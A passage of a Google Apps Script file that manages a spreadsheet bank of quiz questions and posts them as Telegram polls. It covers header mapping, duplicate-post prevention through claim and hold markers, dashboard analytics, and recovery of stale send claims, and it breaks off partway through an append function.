/** Accepted spellings for each canonical header, including the v4 names. */
function headerAliases(canonical) {
  var table = {
    'S.No': ['s no', 'sno', 'sl no', 'serial'],
    'Question ID': ['question id', 'qid', 'id'],
    'Date': ['date'],
    'Newspaper': ['newspaper', 'source'],
    'Subject': ['subject'],
    'Topic': ['topic', 'sub topic', 'subtopic'],
    'Question': ['question', 'question text', 'prompt'],
    'Option A': ['option a', 'opt a'],
    'Option B': ['option b', 'opt b'],
    'Option C': ['option c', 'opt c'],
    'Option D': ['option d', 'opt d'],
    'Correct Answer': ['correct answer', 'answer', 'correct'],
    'Explanation': ['explanation', 'exp'],
    'Difficulty': ['difficulty', 'level'],
    'Tags': ['tags', 'keywords'],
    'Source URL': ['source url', 'url', 'link', 'reference'],
    'Status': ['status', 'workflow'],
    'Posted': ['posted'],
    'Posted At': ['posted at'],
    'Scheduled For': ['scheduled for', 'schedule at'],
    'Thread ID': ['thread id', 'topic thread id'],
    'Telegram Msg ID': ['telegram msg id', 'message id', 'msg id'],
    'Poll ID': ['poll id'],
    'Times Posted': ['times posted', 'post count'],
    'Added At': ['added at'],
    'Added By': ['added by', 'uploader'],
    'Updated At': ['updated at', 'modified at'],
    'Updated By': ['updated by', 'modified by'],
    'Dup Hash': ['dup hash', 'hash', 'fingerprint'],
    'Review Notes': ['review notes', 'notes', 'remarks']
  };
  return table[canonical] || [normaliseHeader(canonical)];
}

/**
 * isPostedValue — true when a Posted cell means "this went out".
 *
 * The v2 layout stored the flag and the timestamp together in one cell, e.g.
 * `YES | 05/09/2026, 01:16:53 PM`. Testing for an exact 'YES' would read those
 * rows as unposted, which on migration would have cleared the flag and queued
 * every already-published question to be sent to Telegram a second time.
 *
 * @param {*} value Raw cell contents
 * @returns {boolean}
 */
function isPostedValue(value) {
  return /^\s*yes\b/i.test(String(value === null || value === undefined ? '' : value));
}

/**
 * isClaimedValue — is this row mid-send?
 *
 * The Posted column holds "SENDING | <when> | <status>" between the moment a
 * question is handed to Telegram and the moment delivery is confirmed, and
 * "CHECK | <when>" once a run has given up on it. Both mean the row is not
 * available; only the first is ever handed back automatically. Telegram can accept
 * a poll and still leave the caller with a timeout or a dropped connection, so
 * a row that is only marked AFTER a confirmed send can be delivered and left
 * looking unposted — which is what put two questions into an endless re-post
 * loop, going out again on every run.
 *
 * A claimed row is not eligible, so that can no longer happen. It is also not
 * "Posted": it is unresolved, and the dashboard shows it as such.
 *
 * @param {*} value Raw Posted cell contents
 * @returns {boolean}
 */
function isClaimedValue(value) {
  return /^\s*(sending|check)\b/i.test(String(value === null || value === undefined ? '' : value));
}

/**
 * isHeldValue — is this row waiting for a person?
 *
 * "CHECK | <when>" means the poll may well be in the channel: Telegram never
 * answered, or it answered and the sheet write failed. Such a row is never
 * handed back automatically, because posting it again could double-post it.
 */
function isHeldValue(value) {
  return /^\s*check\b/i.test(String(value === null || value === undefined ? '' : value));
}

/** The "<when>" of a "SENDING | <when> | <status>" marker, or ''. */
function claimedAtFrom(value) {
  var parts = String(value === null || value === undefined ? '' : value).split('|');
  return parts.length > 1 ? String(parts[1]).trim() : '';
}

/** The status a claim interrupted, from its marker. Defaults to Approved. */
function claimedStatusFrom(value) {
  var parts = String(value === null || value === undefined ? '' : value).split('|');
  var stored = parts.length > 2 ? String(parts[2]).trim() : '';
  return normaliseChoice(stored, STATUS_VALUES, 'Approved');
}

/**
 * postedTimestampFrom — pulls the timestamp out of a legacy `YES | <when>` cell.
 *
 * @param {*} value Raw Posted cell contents
 * @returns {string} The timestamp portion, or '' when there is none
 */
function postedTimestampFrom(value) {
  var match = String(value === null || value === undefined ? '' : value).match(/^\s*yes\s*\|\s*(.+)$/i);
  return match ? match[1].trim() : '';
}

/** Reads a cell from a row array using the header map, always as trimmed text. */
function cell(row, map, header) {
  var idx = map[header];
  if (idx === undefined || idx < 0 || idx >= row.length) return '';
  var v = row[idx];
  if (v instanceof Date) return Utilities.formatDate(v, 'Asia/Kolkata', 'dd-MM-yyyy');
  return String(v === null || v === undefined ? '' : v).trim();
}

/** 1-based sheet column number for a canonical header, safe for writes. */
function colNum(map, header) {
  return writeIndex(map, header) + 1;
}

// ============================================================================
// Reads
// ============================================================================

/** Names of every sheet tab that holds questions (excludes Config etc). */
function listSubjectSheets() {
  return book().getSheets()
    .map(function (s) { return s.getName(); })
    .filter(function (n) { return RESERVED_SHEETS.indexOf(n) === -1; });
}

/** Reads the Config tab into structured objects. */
function fetchConfigFromSheet() {
  var ss = book();
  var sheet = ss.getSheetByName('Config');
  if (!sheet) throw new Error('Sheet named "Config" not found. Run setupSpreadsheet() first.');

  var lastRow = sheet.getLastRow();
  if (lastRow <= 1) return [];

  return sheet.getRange(2, 1, lastRow - 1, 6).getValues()
    .map(function (row) {
      return {
        subject: String(row[0] || '').trim(),
        emoji: String(row[1] || '').trim(),
        topic_thread_id: Number(row[2]) || null,
        schedule_cron: String(row[3] || '').trim(),
        questions_per_batch: Number(row[4]) || 5,
        active: String(row[5] || '').trim().toUpperCase() === 'YES'
      };
    })
    .filter(function (item) { return item.subject.length > 0; });
}

/** Converts one sheet row into the question object the rest of the app uses. */
function rowToQuestion(row, map, subject, dataIndex) {
  return {
    s_no: cell(row, map, 'S.No') || (dataIndex + 1),
    question_id: cell(row, map, 'Question ID'),
    date: cell(row, map, 'Date'),
    newspaper: cell(row, map, 'Newspaper'),
    subject: cell(row, map, 'Subject') || subject,
    topic: cell(row, map, 'Topic'),
    question_text: cell(row, map, 'Question'),
    option_a: cell(row, map, 'Option A'),
    option_b: cell(row, map, 'Option B'),
    option_c: cell(row, map, 'Option C'),
    option_d: cell(row, map, 'Option D'),
    correct_answer: cell(row, map, 'Correct Answer').toUpperCase() || 'A',
    explanation: cell(row, map, 'Explanation'),
    difficulty: cell(row, map, 'Difficulty') || 'Medium',
    tags: cell(row, map, 'Tags'),
    source_url: cell(row, map, 'Source URL'),
    status: cell(row, map, 'Status') || 'Draft',
    // Normalised to a strict YES/NO here so every caller can compare directly;
    // posted_raw keeps the original cell for the migration to mine.
    posted: isPostedValue(cell(row, map, 'Posted')) ? 'YES' : 'NO',
    // Mid-send: neither posted nor available. See isClaimedValue.
    claimed: isClaimedValue(cell(row, map, 'Posted')),
    // Waiting for a person: the poll may be in the channel. See isHeldValue.
    held: isHeldValue(cell(row, map, 'Posted')),
    posted_raw: cell(row, map, 'Posted'),
    posted_at: cell(row, map, 'Posted At'),
    scheduled_for: cell(row, map, 'Scheduled For'),
    thread_id: cell(row, map, 'Thread ID'),
    telegram_msg_id: cell(row, map, 'Telegram Msg ID'),
    poll_id: cell(row, map, 'Poll ID'),
    times_posted: Number(cell(row, map, 'Times Posted')) || 0,
    added_at: cell(row, map, 'Added At'),
    added_by: cell(row, map, 'Added By'),
    updated_at: cell(row, map, 'Updated At'),
    updated_by: cell(row, map, 'Updated By'),
    dup_hash: cell(row, map, 'Dup Hash'),
    review_notes: cell(row, map, 'Review Notes'),
    row_index: dataIndex,
    excel_row: dataIndex + 2
  };
}

/**
 * fetchUnpostedQuestions — rows where Posted !== YES, skipping Rejected and
 * Archived so a rejected question can never leak onto the channel.
 *
 * @param {boolean} requireApproved When true only Status=Approved rows qualify.
 */
function fetchUnpostedQuestions(subject, limit, requireApproved) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found in spreadsheet.');

  var lastRow = sheet.getLastRow();
  if (lastRow <= 1) return [];

  var map = headerMap(sheet);
  var lastCol = Math.max(sheet.getLastColumn(), COL_COUNT);
  var data = sheet.getRange(2, 1, lastRow - 1, lastCol).getValues();
  var results = [];

  for (var i = 0; i < data.length && results.length < limit; i++) {
    var q = rowToQuestion(data[i], map, subject, i);
    if (!q.question_text) continue;
    if (q.posted.toUpperCase() === 'YES') continue;
    // Handed to Telegram and not yet resolved. Sending it again is exactly the
    // duplicate this marker exists to prevent, so it waits for a human.
    if (q.claimed) continue;
    if (q.status === 'Rejected' || q.status === 'Archived') continue;
    if (requireApproved && q.status !== 'Approved' && q.status !== 'Scheduled') continue;
    results.push(q);
  }
  return results;
}

/**
 * listQuestions — filtered, paginated browse used by the Questions dashboard.
 * Filters: subject (or "all"), status, posted, difficulty, search, page, pageSize.
 */
function listQuestions(params) {
  var subjectParam = String(params.subject || 'all').trim();
  var subjects = (subjectParam === 'all' || !subjectParam) ? listSubjectSheets() : [subjectParam];

  var statusFilter = String(params.status || '').trim();
  var postedFilter = String(params.posted || '').trim().toUpperCase();
  var difficultyFilter = String(params.difficulty || '').trim();
  var search = String(params.search || '').trim().toLowerCase();
  var page = clampInt(params.page, 1, 1, 100000);
  var pageSize = clampInt(params.pageSize, 25, 1, 200);

  var ss = book();
  var matched = [];

  for (var s = 0; s < subjects.length; s++) {
    var sheet = ss.getSheetByName(subjects[s]);
    if (!sheet) continue;
    var lastRow = sheet.getLastRow();
    if (lastRow <= 1) continue;

    var map = headerMap(sheet);
    var lastCol = Math.max(sheet.getLastColumn(), COL_COUNT);
    var data = sheet.getRange(2, 1, lastRow - 1, lastCol).getValues();

    for (var i = 0; i < data.length; i++) {
      var q = rowToQuestion(data[i], map, subjects[s], i);
      if (!q.question_text) continue;
      if (statusFilter && q.status !== statusFilter) continue;
      if (postedFilter && q.posted.toUpperCase() !== postedFilter) continue;
      if (difficultyFilter && q.difficulty !== difficultyFilter) continue;
      if (search) {
        var haystack = (q.question_text + ' ' + q.explanation + ' ' + q.tags + ' ' +
                        q.topic + ' ' + q.question_id + ' ' + q.newspaper).toLowerCase();
        if (haystack.indexOf(search) === -1) continue;
      }
      matched.push(q);
    }
  }

  var total = matched.length;
  var start = (page - 1) * pageSize;

  // Counted over everything the filter matched, not just the page being
  // returned. The dashboard used to count the rows it had been handed, so with
  // 303 matches and a 200-row page "Posted" read 200 — a number describing the
  // pagination rather than the question bank. matched already holds every row,
  // so this costs one more pass over it and no extra sheet reads.
  var counts = { posted: 0, approved: 0, needsDetail: 0 };
  for (var m = 0; m < matched.length; m++) {
    var row = matched[m];
    if (String(row.posted).toUpperCase() === 'YES') counts.posted++;
    if (row.status === 'Approved') counts.approved++;
    if (!row.explanation || !row.topic) counts.needsDetail++;
  }

  return {
    total: total,
    page: page,
    pageSize: pageSize,
    totalPages: Math.max(1, Math.ceil(total / pageSize)),
    counts: counts,
    questions: matched.slice(start, start + pageSize)
  };
}

/** Summary counts per subject — the shape `node send.js --stats` prints. */
function fetchSummaryStats() {
  var analytics = buildAnalytics();
  return analytics.subjects.map(function (s) {
    return { subject: s.subject, total: s.total, posted: s.posted, pending: s.pending };
  });
}

/**
 * buildAnalytics — one pass over every subject tab producing everything the
 * Analytics dashboard renders: per-subject rollups, status and difficulty
 * breakdowns, curator contributions, a posting timeline and data-quality flags.
 */
function buildAnalytics() {
  var ss = book();
  var configs = [];
  try { configs = fetchConfigFromSheet(); } catch (err) { configs = []; }

  // Build the subject list from Config, then add any orphan tabs not in Config.
  var subjectNames = configs.map(function (c) { return c.subject; });
  listSubjectSheets().forEach(function (n) {
    if (subjectNames.indexOf(n) === -1) subjectNames.push(n);
  });

  var configBySubject = {};
  configs.forEach(function (c) { configBySubject[c.subject] = c; });

  var subjects = [];
  var statusTotals = {};
  var difficultyTotals = {};
  var curators = {};
  var postedByDay = {};
  var addedByDay = {};
  var newspapers = {};
  var qualityIssues = { missingExplanation: 0, missingOptions: 0, missingDate: 0, missingTopic: 0, duplicates: 0 };
  var hashSeen = {};

  STATUS_VALUES.forEach(function (s) { statusTotals[s] = 0; });
  DIFFICULTY_VALUES.forEach(function (d) { difficultyTotals[d] = 0; });

  var grand = { total: 0, posted: 0, pending: 0, approved: 0, scheduled: 0 };

  for (var s = 0; s < subjectNames.length; s++) {
    var name = subjectNames[s];
    var sheet = ss.getSheetByName(name);
    var entry = {
      subject: name,
      total: 0, posted: 0, pending: 0, approved: 0, draft: 0, rejected: 0, scheduled: 0,
      easy: 0, medium: 0, hard: 0,
      lastPostedAt: '', lastAddedAt: '',
      threadId: configBySubject[name] ? configBySubject[name].topic_thread_id : null,
      active: configBySubject[name] ? configBySubject[name].active : false,
      cron: configBySubject[name] ? configBySubject[name].schedule_cron : '',
      batchSize: configBySubject[name] ? configBySubject[name].questions_per_batch : 0,
      sheetExists: Boolean(sheet)
    };

    if (sheet) {
      var lastRow = sheet.getLastRow();
      if (lastRow > 1) {
        var map = headerMap(sheet);
        var lastCol = Math.max(sheet.getLastColumn(), COL_COUNT);
        var data = sheet.getRange(2, 1, lastRow - 1, lastCol).getValues();

        for (var i = 0; i < data.length; i++) {
          var q = rowToQuestion(data[i], map, name, i);
          if (!q.question_text) continue;

          entry.total++;
          var isPosted = q.posted.toUpperCase() === 'YES';
          if (isPosted) { entry.posted++; } else { entry.pending++; }

          var status = STATUS_VALUES.indexOf(q.status) !== -1 ? q.status : 'Draft';
          statusTotals[status]++;
          if (status === 'Approved') entry.approved++;
          if (status === 'Draft') entry.draft++;
          if (status === 'Rejected') entry.rejected++;
          if (status === 'Scheduled') entry.scheduled++;

          var diff = DIFFICULTY_VALUES.indexOf(q.difficulty) !== -1 ? q.difficulty : 'Medium';
          difficultyTotals[diff]++;
          if (diff === 'Easy') entry.easy++;
          if (diff === 'Medium') entry.medium++;
          if (diff === 'Hard') entry.hard++;

          if (q.added_by) {
            if (!curators[q.added_by]) curators[q.added_by] = { curator: q.added_by, added: 0, posted: 0 };
            curators[q.added_by].added++;
            if (isPosted) curators[q.added_by].posted++;
          }

          if (q.newspaper) newspapers[q.newspaper] = (newspapers[q.newspaper] || 0) + 1;

          var postedDay = dayKey(q.posted_at);
          if (isPosted && postedDay) postedByDay[postedDay] = (postedByDay[postedDay] || 0) + 1;
          var addedDay = dayKey(q.added_at);
          if (addedDay) addedByDay[addedDay] = (addedByDay[addedDay] || 0) + 1;

          if (q.posted_at && q.posted_at !== '-' && q.posted_at > entry.lastPostedAt) entry.lastPostedAt = q.posted_at;
          if (q.added_at && q.added_at !== '-' && q.added_at > entry.lastAddedAt) entry.lastAddedAt = q.added_at;

          if (!q.explanation) qualityIssues.missingExplanation++;
          if (!q.option_a || !q.option_b || !q.option_c || !q.option_d) qualityIssues.missingOptions++;
          if (!q.date || q.date === '-') qualityIssues.missingDate++;
          if (!q.topic) qualityIssues.missingTopic++;

          var h = q.dup_hash || hashQuestion(q.question_text);
          if (hashSeen[h]) { qualityIssues.duplicates++; } else { hashSeen[h] = true; }
        }
      }
    }

    // Runway: at the configured batch size and cron cadence, how many days of
    // pending questions remain before this subject runs dry.
    entry.batchesRemaining = entry.batchSize > 0 ? Math.floor(entry.pending / entry.batchSize) : 0;
    entry.postsPerDay = cronRunsPerDay(entry.cron);
    entry.daysOfRunway = (entry.active && entry.postsPerDay > 0 && entry.batchSize > 0)
      ? Math.round((entry.pending / (entry.postsPerDay * entry.batchSize)) * 10) / 10
      : null;

    grand.total += entry.total;
    grand.posted += entry.posted;
    grand.pending += entry.pending;
    grand.approved += entry.approved;
    grand.scheduled += entry.scheduled;
    subjects.push(entry);
  }

  return {
    generatedAt: Utilities.formatDate(new Date(), 'Asia/Kolkata', 'dd-MM-yyyy, hh:mm:ss a') + ' IST',
    totals: {
      total: grand.total,
      posted: grand.posted,
      pending: grand.pending,
      approved: grand.approved,
      scheduled: grand.scheduled,
      subjects: subjects.length,
      activeSubjects: subjects.filter(function (s) { return s.active; }).length,
      completionPct: grand.total ? Math.round((grand.posted / grand.total) * 1000) / 10 : 0,
      emptySubjects: subjects.filter(function (s) { return s.total === 0; }).length,
      lowStockSubjects: subjects.filter(function (s) { return s.total > 0 && s.pending < 10; }).length
    },
    subjects: subjects,
    statusBreakdown: statusTotals,
    difficultyBreakdown: difficultyTotals,
    curators: Object.keys(curators).map(function (k) { return curators[k]; })
      .sort(function (a, b) { return b.added - a.added; }),
    newspapers: Object.keys(newspapers).map(function (k) { return { newspaper: k, count: newspapers[k] }; })
      .sort(function (a, b) { return b.count - a.count; }).slice(0, 15),
    postedTimeline: toSortedSeries(postedByDay),
    addedTimeline: toSortedSeries(addedByDay),
    qualityIssues: qualityIssues
  };
}

/** Turns a {day: count} map into a chronologically sorted array for charting. */
function toSortedSeries(map) {
  return Object.keys(map)
    .sort()
    .map(function (k) { return { day: k, count: map[k] }; })
    .slice(-60);
}

/**
 * dayKey — extracts a sortable YYYY-MM-DD key from the "dd-MM-yyyy, hh:mm:ss a IST"
 * timestamps this script writes. Returns '' for placeholders like '-'.
 */
function dayKey(ts) {
  if (!ts || ts === '-') return '';
  var m = String(ts).match(/^(\d{2})-(\d{2})-(\d{4})/);
  if (!m) return '';
  return m[3] + '-' + m[2] + '-' + m[1];
}

/**
 * cronRunsPerDay — rough count of daily executions for the simple cron forms
 * used in the Config tab (`0 9,18 * * *`, `0 * / 3 * * *`). Used for runway math.
 */
function cronRunsPerDay(cron) {
  if (!cron) return 0;
  var parts = String(cron).trim().split(/\s+/);
  if (parts.length < 5) return 0;
  var hour = parts[1];
  if (hour === '*') return 24;
  var stepMatch = hour.match(/^\*\/(\d+)$/);
  if (stepMatch) return Math.floor(24 / Math.max(1, Number(stepMatch[1])));
  return hour.split(',').filter(function (h) { return h !== ''; }).length;
}

/** Returns the subset of supplied hashes that already exist anywhere in the book. */
function findExistingHashes(hashes) {
  if (!hashes.length) return { existing: [] };
  var wanted = {};
  hashes.forEach(function (h) { wanted[h] = true; });

  var ss = book();
  var names = listSubjectSheets();
  var existing = {};

  for (var s = 0; s < names.length; s++) {
    var sheet = ss.getSheetByName(names[s]);
    var lastRow = sheet.getLastRow();
    if (lastRow <= 1) continue;
    var map = headerMap(sheet);
    var col = colNum(map, 'Dup Hash');
    if (col > sheet.getLastColumn()) continue;
    var values = sheet.getRange(2, col, lastRow - 1, 1).getValues();
    for (var i = 0; i < values.length; i++) {
      var h = String(values[i][0] || '').trim();
      if (h && wanted[h]) existing[h] = names[s];
    }
  }
  return {
    existing: Object.keys(existing).map(function (h) { return { hash: h, subject: existing[h] }; })
  };
}

// ============================================================================
// Writes
// ============================================================================

/**
 * unpostQuestionRows — puts rows back in the queue after their poll was deleted.
 *
 * Deleting a poll in Telegram used to leave the sheet claiming it was posted
 * for ever, so the question could never be sent again and the counts were
 * wrong. The dashboard's reconcile pass checks the channel and calls this for
 * the ones that are gone.
 *
 * The posting trail is cleared with them: a Telegram Msg ID pointing at a
 * message that no longer exists is worse than an empty cell, because the next
 * reconcile would keep re-reporting it.
 *
 * @param {string} subject Sheet tab
 * @param {Array<number>} rowNumbers 1-based sheet rows
 * @param {string} [status] Status to restore, default Approved
 * @returns {number} Rows returned to the queue
 */
function unpostQuestionRows(subject, rowNumbers, status) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');

  return withScriptLock(function () {
    var map = headerMap(sheet);
    var lastRow = sheet.getLastRow();
    var restore = normaliseChoice(status || 'Approved', STATUS_VALUES, 'Approved');
    var count = 0;

    for (var i = 0; i < rowNumbers.length; i++) {
      var rowNumber = Number(rowNumbers[i]);
      if (!isFinite(rowNumber) || rowNumber < 2 || rowNumber > lastRow) continue;

      sheet.getRange(rowNumber, colNum(map, 'Posted')).setValue('NO');
      sheet.getRange(rowNumber, colNum(map, 'Status')).setValue(restore);
      sheet.getRange(rowNumber, colNum(map, 'Posted At')).setValue('');
      sheet.getRange(rowNumber, colNum(map, 'Telegram Msg ID')).setValue('');
      sheet.getRange(rowNumber, colNum(map, 'Poll ID')).setValue('');
      // Times Posted is history and stays: it still went out once.
      count++;
    }
    return count;
  });
}

/**
 * listPostedQuestions — posted rows that carry a Telegram message id.
 *
 * What the reconcile pass walks. Rows with no message id are skipped: they
 * predate message-id tracking and there is nothing to check them against.
 *
 * @param {string} subject Sheet tab
 * @returns {Array<Object>} { row, question_id, message_id, status }
 */
function listPostedQuestions(subject) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');

  var lastRow = sheet.getLastRow();
  if (lastRow <= 1) return [];

  var map = headerMap(sheet);
  var lastCol = Math.max(sheet.getLastColumn(), COL_COUNT);
  var data = sheet.getRange(2, 1, lastRow - 1, lastCol).getValues();
  var out = [];

  for (var i = 0; i < data.length; i++) {
    var q = rowToQuestion(data[i], map, subject, i);
    if (!q.question_text) continue;
    if (q.posted.toUpperCase() !== 'YES') continue;
    if (!String(q.telegram_msg_id || '').trim()) continue;
    out.push({
      row: q.excel_row,
      question_id: q.question_id,
      message_id: String(q.telegram_msg_id).trim(),
      status: q.status
    });
  }
  return out;
}

/**
 * claimQuestionRows — reserves rows for sending, before anything is sent.
 *
 * Writes "SENDING | <when> | <status>" into Posted so the row stops being
 * eligible the
 * moment it is handed to Telegram, rather than when delivery is confirmed.
 * The status is kept so an abandoned claim can be undone exactly.
 * Telegram can accept a poll and still leave the sender with a timeout or a
 * dropped connection; a row marked only on confirmation is then delivered and
 * still looks unposted, and goes out again on the next run — forever. Two
 * questions were stuck in exactly that loop.
 *
 * Only genuinely available rows are claimed: anything already posted or
 * already claimed comes back as skipped rather than being taken twice, which
 * is also what stops two overlapping runs sending the same question.
 *
 * @param {string} subject Sheet tab
 * @param {Array<number>} rowNumbers 1-based sheet rows
 * @returns {Object} { claimed: [rows], skipped: [{row, reason}] }
 */
function claimQuestionRows(subject, rowNumbers) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');

  // A sheet set up by an older script still carries a YES/NO-only rule on the
  // Posted column, which rejects the SENDING marker and takes the whole write
  // down with it. Repair the rules before writing rather than requiring the
  // curator to know they need re-running.
  applyPostedDataValidation(sheet);

  return withScriptLock(function () {
    var map = headerMap(sheet);
    var lastRow = sheet.getLastRow();
    var now = istNow();
    var claimed = [];
    var skipped = [];
    var seen = {};

    for (var i = 0; i < rowNumbers.length; i++) {
      var rowNumber = Number(rowNumbers[i]);
      if (!isFinite(rowNumber) || rowNumber < 2 || rowNumber > lastRow) {
        skipped.push({ row: rowNumbers[i], reason: 'no such row' });
        continue;
      }
      if (seen[rowNumber]) continue;
      seen[rowNumber] = true;

      var current = sheet.getRange(rowNumber, colNum(map, 'Posted')).getValue();
      if (isPostedValue(current)) { skipped.push({ row: rowNumber, reason: 'already posted' }); continue; }
      if (isClaimedValue(current)) { skipped.push({ row: rowNumber, reason: 'already sending' }); continue; }

      // The status the row had is written into the marker, so a claim left
      // behind by a run that never finished can be undone exactly (see
      // recoverStaleClaims) instead of guessing "Approved".
      var previous = normaliseChoice(sheet.getRange(rowNumber, colNum(map, 'Status')).getValue(),
        STATUS_VALUES, 'Approved');
      if (previous === 'Sending' || previous === 'Posted') previous = 'Approved';
      sheet.getRange(rowNumber, colNum(map, 'Posted')).setValue('SENDING | ' + now + ' | ' + previous);
      sheet.getRange(rowNumber, colNum(map, 'Status')).setValue('Sending');
      claimed.push(rowNumber);
    }

    return { claimed: claimed, skipped: skipped };
  });
}

/**
 * releaseQuestionRows — undoes a claim for a send that definitely did not happen.
 *
 * Only for a refusal Telegram made BEFORE delivering: a malformed poll, a
 * question over the character limit, a bot removed from the group. A timeout
 * or a dropped connection is not that — the poll may well be in the channel —
 * so those keep the claim and wait for a person.
 *
 * @param {string} subject Sheet tab
 * @param {Array<number>} rowNumbers 1-based sheet rows
 * @param {string} [status] Status to restore, default Approved
 * @returns {number} Rows released
 */
function releaseQuestionRows(subject, rowNumbers, status) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');

  return withScriptLock(function () {
    var map = headerMap(sheet);
    var lastRow = sheet.getLastRow();
    var restore = normaliseChoice(status || 'Approved', STATUS_VALUES, 'Approved');
    var released = 0;

    for (var i = 0; i < rowNumbers.length; i++) {
      var rowNumber = Number(rowNumbers[i]);
      if (!isFinite(rowNumber) || rowNumber < 2 || rowNumber > lastRow) continue;

      // Never clear a row that reached Posted in the meantime.
      if (!isClaimedValue(sheet.getRange(rowNumber, colNum(map, 'Posted')).getValue())) continue;

      sheet.getRange(rowNumber, colNum(map, 'Posted')).setValue('NO');
      sheet.getRange(rowNumber, colNum(map, 'Status')).setValue(restore);
      released++;
    }
    return released;
  });
}

/**
 * recoverStaleClaims — puts rows back in the queue when the run that claimed
 * them never finished.
 *
 * A claim is only meaningful while a posting run is alive. A run killed
 * mid-batch — a serverless timeout, a closed laptop, a dropped deploy — used to
 * leave its unsent rows marked "Sending" for ever: they were not posted, and
 * they could never be posted again either. Anything claimed longer ago than
 * `minutes` is therefore handed back to the status it had.
 *
 * Rows HELD for checking ("CHECK | …") are left alone: those may be in the
 * channel, and only a person can say.
 *
 * @param {string} subject Sheet tab
 * @param {number} minutes How old a claim must be to count as abandoned
 * @returns {Object} { recovered: [{row, question_id, status, claimed_at}], held: n }
 */
function recoverStaleClaims(subject, minutes) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');

  var olderThan = Math.max(1, Number(minutes) || 15);

  return withScriptLock(function () {
    var map = headerMap(sheet);
    var lastRow = sheet.getLastRow();
    var recovered = [];
    var held = 0;
    if (lastRow <= 1) return { recovered: recovered, held: held };

    var postedColNum = colNum(map, 'Posted');
    var statusColNum = colNum(map, 'Status');
    var postedCol = sheet.getRange(2, postedColNum, lastRow - 1, 1).getValues();
    var idCol = sheet.getRange(2, colNum(map, 'Question ID'), lastRow - 1, 1).getValues();
    var cutoff = Date.now() - olderThan * 60 * 1000;

    for (var i = 0; i < postedCol.length; i++) {
      var value = postedCol[i][0];
      if (!isClaimedValue(value)) continue;
      if (isHeldValue(value)) { held++; continue; }

      // An unreadable stamp is treated as old: the alternative is a row that
      // can never be posted again. Claims are written by the script itself, so
      // this should not happen.
      var claimedAt = parseIstDate(claimedAtFrom(value));
      if (claimedAt && claimedAt.getTime() > cutoff) continue;

      var rowNumber = i + 2;
      var restore = claimedStatusFrom(value);
      sheet.getRange(rowNumber, postedColNum).setValue('NO');
      sheet.getRange(rowNumber, statusColNum).setValue(restore);
      recovered.push({
        row: rowNumber,
        question_id: String(idCol[i][0] || '').trim(),
        status: restore,
        claimed_at: claimedAtFrom(value)
      });
    }
    return { recovered: recovered, held: held };
  });
}

/**
 * holdQuestionRows — marks rows that need a person before anything else
 * happens to them: the poll may be in the channel, but the sheet does not say
 * so. They stay out of the queue and are never recovered automatically.
 *
 * @param {string} subject Sheet tab
 * @param {Array<number>} rowNumbers 1-based sheet rows
 * @param {string} [note] What happened, for the Review Notes column
 * @returns {number} Rows held
 */
function holdQuestionRows(subject, rowNumbers, note) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found.');

  return withScriptLock(function () {
    var map = headerMap(sheet);
    var lastRow = sheet.getLastRow();
    var now = istNow();
    var held = 0;

    for (var i = 0; i < rowNumbers.length; i++) {
      var rowNumber = Number(rowNumbers[i]);
      if (!isFinite(rowNumber) || rowNumber < 2 || rowNumber > lastRow) continue;
      // Never touch a row that reached Posted in the meantime.
      if (isPostedValue(sheet.getRange(rowNumber, colNum(map, 'Posted')).getValue())) continue;

      sheet.getRange(rowNumber, colNum(map, 'Posted')).setValue('CHECK | ' + now);
      sheet.getRange(rowNumber, colNum(map, 'Status')).setValue('Sending');
      if (note) {
        var notesCol = colNum(map, 'Review Notes');
        var existing = String(sheet.getRange(rowNumber, notesCol).getValue() || '').trim();
        var line = '[' + now + '] ' + note;
        sheet.getRange(rowNumber, notesCol).setValue(safeCell(existing ? existing + '\n' + line : line));
      }
      held++;
    }
    return held;
  });
}

/**
 * markRowsAsPostedInSheet — flips Posted to YES and records the full posting
 * trail: timestamp, status, thread id, message id, poll id and repost count.
 *
 * @param {Object} pollIds Optional { rowNumber: pollId } map from the sender.
 */
function markRowsAsPostedInSheet(subject, rowIndices, messageId, threadId, pollIds) {
  var sheet = book().getSheetByName(subject);
  if (!sheet) throw new Error('Sheet tab "' + subject + '" not found in spreadsheet.');

  var map = headerMap(sheet);
  var now = istNow();
  var updated = 0;

  // Row numbers are 1-based sheet rows (row 1 is the header, so data starts at
  // 2). The old code guessed between a 0-based data index and a sheet row with
  // `n < 2 ? n + 2 : n`, which silently collapsed the 3rd, 4th and 5th rows of
  // a batch onto rows 2, 3 and 4 — so most of a batch was posted to Telegram
  // but never marked, and got posted again on the next run. No guessing now.
  var seen = {};

  for (var i = 0; i < rowIndices.length; i++) {
    var rowNumber = Number(rowIndices[i]);
    if (!isFinite(rowNumber) || rowNumber < 2 || rowNumber > sheet.getLastRow()) continue;
    // A repeated row in one batch must not inflate Times Posted.
    if (seen[rowNumber]) continue;
    seen[rowNumber] = true;

    var prior = Number(sheet.getRange(rowNumber, colNum(map, 'Times Posted')).getValue()) || 0;

    sheet.getRange(rowNumber, colNum(map, 'Posted')).setValue('YES');
    sheet.getRange(rowNumber, colNum(map, 'Posted At')).setValue(now);
    sheet.getRange(rowNumber, colNum(map, 'Status')).setValue('Posted');
    sheet.getRange(rowNumber, colNum(map, 'Times Posted')).setValue(prior + 1);
    if (threadId) sheet.getRange(rowNumber, colNum(map, 'Thread ID')).setValue(String(threadId));
    if (messageId) sheet.getRange(rowNumber, colNum(map, 'Telegram Msg ID')).setValue(String(messageId));
    if (pollIds && pollIds[String(rowNumber)]) {
      sheet.getRange(rowNumber, colNum(map, 'Poll ID')).setValue(String(pollIds[String(rowNumber)]));
    }
    updated++;
  }
  return updated;
}

/**
 * appendQuestionsToSheet — writes new questions in one batch, assigning a stable
 * Question ID and duplicate hash to each, and skipping rows whose hash already
 * exists in the target sheet when skipDuplicates is on.
 */
function appendQuestionsToSheet(subject, questions, addedBy, skipDuplicates) {
  // Read-then-append, and everything it reads decides what it writes: the
  // existing hashes decide which rows are duplicates, and the last S.No decides
